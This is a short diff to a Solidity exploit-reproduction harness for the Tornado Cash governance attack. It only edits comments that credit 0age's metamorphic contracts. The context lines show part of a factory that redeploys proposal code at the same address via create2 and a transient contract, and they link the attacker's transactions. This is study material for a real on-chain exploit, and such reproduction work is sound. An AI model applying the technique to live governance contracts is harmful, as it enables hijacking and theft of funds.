@@ -148,7 +148,8 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
 // using a combination of create2 and create with a transient contract
 // Deployed at tx:
 // https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
-// Heavily inspired by 0age Metamorphic contracts: https://github.com/0age/metamorphic/
+// We use the implementation to reproduce metamorphic contracts made by 0age:
+// https://github.com/0age/metamorphic
 contract ReinitializableContractFactory is Ownable {
     bytes _transientContractInitializationCode;
     bytes32 _transientContractInitializationCodeHash;
@@ -196,7 +197,6 @@ contract ReinitializableContractFactory is Ownable {
     // More details:
     // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
     // Method called after: 0xce40d339 in the attacker's contract factory
-    /// @dev base impl by 0age
     function createProposalWithTransient(bytes32 salt, bytes memory proposalInitializationCode)
         public
         payable
@@ -239,7 +239,6 @@ contract ReinitializableContractFactory is Ownable {
         transient = deployedTransientContract;
     }
 
-    /// @dev impl by 0age
     function _getProposalAddress(address transientContractAddress) internal pure returns (address) {
         // determine the address of the metamorphic contract.
         return address(
@@ -258,12 +257,10 @@ contract ReinitializableContractFactory is Ownable {
         );
     }
 
-    /// @dev impl by 0age
     function getInitializationCode() external view returns (bytes memory initializationCode) {
         return _initCodes[msg.sender];
     }
 
-    /// @dev impl by 0age
     function getTransientContractAddress(bytes32 salt) public view returns (address) {
         // determine the address of the transient contract.
         return address(
